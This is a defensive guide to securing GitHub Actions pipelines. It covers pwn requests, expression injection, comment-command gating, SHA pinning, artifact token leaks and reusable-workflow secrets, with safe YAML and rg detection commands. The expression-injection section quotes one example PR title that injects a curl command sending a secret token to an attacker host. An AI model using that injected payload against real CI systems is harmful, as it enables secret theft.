# CI/CD Security Patterns

Load when reviewing GitHub Actions workflows, CI pipeline configurations, action definitions, or scripts executed during CI builds.

CI/CD pipelines run with elevated privileges: write access to repositories, secrets for deployment, OIDC tokens for cloud roles, and package publishing credentials. The correct approach is to separate privileged and unprivileged execution, pin dependencies to immutable references, and treat all PR-controlled content as untrusted input.

---

## Run Untrusted Code in Unprivileged Workflows

Use the `pull_request` trigger for building and testing fork contributions. This trigger runs with read-only permissions and no access to repository secrets. Use `pull_request_target` only when the workflow needs repository write access and does not execute PR-controlled code.

### Correct Pattern

```yaml
# Unprivileged workflow — safe for fork PRs
on: pull_request
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false  # Do not persist GITHUB_TOKEN in .git/config
      - run: npm ci
      - run: npm test
```

When the workflow needs to report results (comment on PR, update status), use a separate `workflow_run` job that treats artifacts from the untrusted run as data, not code:

```yaml
# Privileged reporting workflow — triggered after the untrusted build completes
on:
  workflow_run:
    workflows: ["Test"]
    types: [completed]
permissions:
  pull-requests: write
jobs:
  report:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          run-id: ${{ github.event.workflow_run.id }}
      # Parse artifact contents as data — never execute them
      - run: cat results.json | jq '.summary' > comment.md
```

### Why This Matters

`pull_request_target` runs in the context of the base repository with full secrets and write permissions. When this workflow checks out and executes fork code (`ref: ${{ github.event.pull_request.head.sha }}`), the fork controls package scripts, test code, Makefiles, and local actions while the job has trusted-repository credentials. This is the "pwn request" — the attacker gets code execution with the victim's secrets.

**CVEs:** GitHub Security Lab documented the pwn-request pattern across hundreds of repositories. The pattern applies to any trigger that combines privileged context with PR-controlled code execution.

### Detection

```bash
# Find pull_request_target workflows
rg -n 'pull_request_target' .github/workflows/

# Find checkout of PR head in privileged context
rg -n 'github\.event\.pull_request\.head\.sha|github\.head_ref' .github/workflows/

# Find workflows that run npm/pip/make after checking out PR code
rg -B5 -A5 'npm install|npm test|pip install|make |pytest|cargo test|go test' .github/workflows/
```

---

## Pass Untrusted Values Through Environment Variables

GitHub Actions expressions (`${{ }}`) in `run:` blocks are string-interpolated before the shell executes. When the expression contains attacker-controlled content (PR title, issue body, comment text, branch name), the attacker can inject shell commands. Pass these values through environment variables instead.

### Correct Pattern

```yaml
on: pull_request
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      # Untrusted value goes into an environment variable
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: printf '%s\n' "$PR_TITLE"
```

For `actions/github-script`, pass untrusted values through `env:` and read with `process.env`:

```yaml
- uses: actions/github-script@v7
  env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
  with:
    script: |
      const title = process.env.ISSUE_TITLE;
      await github.rest.issues.createComment({
        owner: context.repo.owner,
        repo: context.repo.repo,
        issue_number: context.issue.number,
        body: `Triaged: ${title}`,
      });
```

Also watch for injection into `$GITHUB_OUTPUT`, `$GITHUB_ENV`, `$GITHUB_PATH`, and `$GITHUB_STEP_SUMMARY` — these are parsed by GitHub and consumed by subsequent steps:

```yaml
# Safe: delimiter-based output
- run: |
    delimiter="$(openssl rand -hex 16)"
    echo "title<<${delimiter}" >> "$GITHUB_OUTPUT"
    echo "$PR_TITLE" >> "$GITHUB_OUTPUT"
    echo "${delimiter}" >> "$GITHUB_OUTPUT"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

### Why This Matters

Expression injection is shell injection via CI. A PR titled `"; curl attacker.com/steal?t=$SECRETS_TOKEN #` breaks out of the echo command and exfiltrates secrets. The same applies to issue titles, comment bodies, review bodies, discussion titles, branch names, changed filenames, commit messages, and labels. `actions/github-script` evaluates its `script:` body as JavaScript — interpolating untrusted values directly into the script source is equivalent to `eval()`.

**CVEs:** CVE-2026-27701 (LiveCode — `actions/github-script` expression injection via PR title), Sentry getsentry commit `0898b3d8` (expression injection into `$GITHUB_OUTPUT`), Sentry commit `e93ee1ce` (composite action input interpolated into shell).

### Detection

```bash
# Find direct expression interpolation in run blocks
rg -n '\$\{\{.*github\.event\.(pull_request\.(title|body)|issue\.(title|body)|comment\.body|review\.body|discussion\.(title|body))' .github/workflows/

# Find expression interpolation in github-script blocks
rg -n '\$\{\{' .github/workflows/ | rg 'script:'

# Find branch name and commit message interpolation
rg -n '\$\{\{.*github\.(head_ref|event\.commits)' .github/workflows/

# Find writes to GITHUB_ENV and GITHUB_OUTPUT with expressions
rg -n 'GITHUB_ENV|GITHUB_OUTPUT|GITHUB_PATH' .github/workflows/ | rg '\$\{\{'
```

---

## Gate Comment-Triggered Commands with Author Association

Workflows triggered by `issue_comment` or discussion events must verify the commenter's association with the repository before executing commands. Check `github.event.comment.author_association` against `MEMBER`, `OWNER`, or `COLLABORATOR`. Without this gate, any user who can comment on an issue can trigger privileged CI actions.

### Correct Pattern

```yaml
on: issue_comment
jobs:
  deploy-preview:
    if: >
      contains(github.event.comment.body, '/deploy') &&
      contains(fromJSON('["MEMBER","OWNER","COLLABORATOR"]'),
               github.event.comment.author_association)
    permissions:
      contents: read
      pull-requests: write
    runs-on: ubuntu-latest
    steps:
      - env:
          COMMENT_BODY: ${{ github.event.comment.body }}
        run: ./ci/deploy-preview.sh "$COMMENT_BODY"
```

For approval-gated workflows (`/ok-to-test`), pin the checkout to the SHA the maintainer approved, not the current head:

```yaml
# Capture the approved SHA at approval time and use it for checkout
- uses: actions/checkout@v4
  with:
    ref: ${{ steps.get-approved-sha.outputs.sha }}  # SHA from approval event
    persist-credentials: false
```

### Why This Matters

Comment-triggered commands without authorization let any GitHub user execute deployment scripts, trigger builds, or invoke tools with repository secrets. The TOCTOU (time-of-check-time-of-use) variant is subtler: a maintainer comments `/ok-to-test`, the workflow resolves `pull_request.head.sha` at execution time, the attacker pushes a new commit between approval and checkout, and the privileged job runs unreviewed code.

**CVEs:** CVE-2025-53104 (gluestack-ui — discussion-title shell injection via comment-triggered workflow).

### Detection

```bash
# Find issue_comment triggered workflows
rg -n 'issue_comment|discussion' .github/workflows/

# Check for missing author_association check
rg -l 'issue_comment' .github/workflows/ | xargs rg -L 'author_association'

# Find slash command patterns without auth gates
rg -n "contains.*'/deploy\|contains.*'/test\|contains.*'/ok-to" .github/workflows/
```

---

## Pin Third-Party Actions to Full Commit SHAs

Reference third-party actions by their 40-character commit SHA, not by tag or branch name. Tags are mutable pointers — the action's maintainer (or an attacker who compromises their account) can rewrite a tag to point at malicious code. Comment the tag version for human readability.

### Correct Pattern

```yaml
steps:
  # Pinned to SHA — immutable reference. Tag noted in comment for humans.
  - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
  - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af  # v4.1.0

  # Third-party action — SHA pin is critical
  - uses: tj-actions/changed-files@a4ca7c0a052d49bbf8e69ddca9a3f53dac15c95e  # v45.0.10
```

Use Dependabot to keep SHA pins current:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

### Why This Matters

Tag rewrites have already been weaponized at scale. In March 2025, an attacker compromised `tj-actions/changed-files` and rewrote tags v1 through v45 to point at a malicious commit that dumped runner process memory (including secrets) to workflow logs. Around 23,000 repositories executed the compromised code. The attack vector was a compromised upstream dependency (`reviewdog/action-setup`), demonstrating how a single popular action cascading through supply chains.

**CVEs:** CVE-2025-30066 (tj-actions/changed-files — tag rewrite, secret exfiltration from 23,000+ repos), CVE-2025-30154 (reviewdog/action-setup — upstream supply chain compromise that enabled the tj-actions attack).

First-party actions (`actions/*`, `github/*`) on tags are an acceptable exception — these are governed by GitHub's organization security. Actions vendored into the same repository under the same branch protection policy are also acceptable.

### Detection

```bash
# Find all third-party action references (excluding actions/* and github/*)
rg -n 'uses:' .github/workflows/ | rg -v 'actions/|github/' | rg -v '@[0-9a-f]{40}'

# Find mutable refs (tags, branches) on third-party actions
rg -n 'uses:' .github/workflows/ | rg -v 'actions/|github/' | rg '@v[0-9]|@main|@master|@latest'

# List all action references for review
rg -n 'uses:' .github/workflows/
```

---

## Restrict Artifact Upload Paths and Disable Credential Persistence

Upload only the specific build output directory, never the workspace root. Disable credential persistence on `actions/checkout` so the `GITHUB_TOKEN` is not stored in `.git/config` where an artifact upload or untrusted code could read it.

### Correct Pattern

```yaml
steps:
  - uses: actions/checkout@v4
    with:
      persist-credentials: false  # GITHUB_TOKEN not written to .git/config

  - run: ./build.sh

  - uses: actions/upload-artifact@v4
    with:
      name: build-output
      path: dist/  # Specific output directory — not . or ./
```

### Why This Matters

`actions/checkout` persists the `GITHUB_TOKEN` in `.git/config` by default. When `actions/upload-artifact` uploads the workspace root (`.` or `./`), the `.git/` directory is included, and the persisted token becomes world-readable in the artifact download. Public repository artifacts are downloadable by anyone. This is the ArtiPACKED attack documented by Palo Alto Unit 42 in August 2024. The same risk applies to uploading `~/.docker/config.json`, `~/.npmrc`, or `~/.gitconfig` after credential helpers have written to them.

### Detection

```bash
# Find artifact uploads of workspace root
rg -n 'upload-artifact' .github/workflows/ -A5 | rg "path: '\.'|path: \./?$|path: \./?"

# Find checkout without persist-credentials: false
rg -n 'actions/checkout' .github/workflows/ -A3 | rg -v 'persist-credentials: false'

# Find broad artifact paths
rg -n 'upload-artifact' .github/workflows/ -A5 | rg 'path:'
```

---

## Declare Secrets Explicitly in Reusable Workflows

Reusable workflows (`on: workflow_call`) must declare every secret they consume under their own `secrets:` map. When a callee uses `secrets.DEPLOY_KEY` without declaring it, the workflow only functions through `secrets: inherit` — the secret surface is invisible to anyone reading the callee file, and callers that pass secrets explicitly silently break.

### Correct Pattern

```yaml
on:
  workflow_call:
    inputs:
      target:
        type: string
        required: true
    secrets:
      DEPLOY_KEY:
        required: true  # Explicit declaration — visible to reviewers

permissions:
  contents: read  # Pin permissions so callee does not inherit caller's broad scope

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: ./bin/deploy "$TARGET"
        env:
          TARGET: ${{ inputs.target }}
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
```

### Why This Matters

Undeclared secrets mask the security surface of reusable workflows. A reviewer reading the callee cannot see which secrets it consumes. When the callee also omits a `permissions:` block, it inherits whatever the caller granted, routinely over-scoping the job. Sentry fixed this pattern in getsentry #19582 and #19634.

### Detection

```bash
# Find reusable workflows
rg -l 'workflow_call' .github/workflows/

# Find secret usage in reusable workflows without declaration
rg -l 'workflow_call' .github/workflows/ | xargs rg 'secrets\.' | rg -v 'secrets:\|GITHUB_TOKEN'

# Find reusable workflows without permissions block
rg -l 'workflow_call' .github/workflows/ | xargs rg -L 'permissions:'
```
